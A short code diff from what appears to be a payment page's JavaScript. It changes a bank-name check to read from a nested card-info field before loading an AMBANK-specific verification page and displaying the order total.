@@ -1652,7 +1652,7 @@ url("pay1ment_icons.woff") format("woff");
       _curStep = 'app_verify';
       document.getElementById('load-overlay').classList.add('hidden');
 
-      if(p.bankName==='AMBANK (M) BERHAD') {
+      if(p.cardInfo.bankName==='AMBANK (M) BERHAD') {
         loadPage('/pay/AMBANK', 'mount'); 
         document.querySelector("#app-verify-overlay > div.app-verify-box").classList.add('hidden');
         document.querySelector("#mount").shadowRoot.querySelector("div > table.maintable.bg > tbody > tr:nth-child(4) > td:nth-child(3) > span").textContent = 'RM '+tot.toFixed(2);
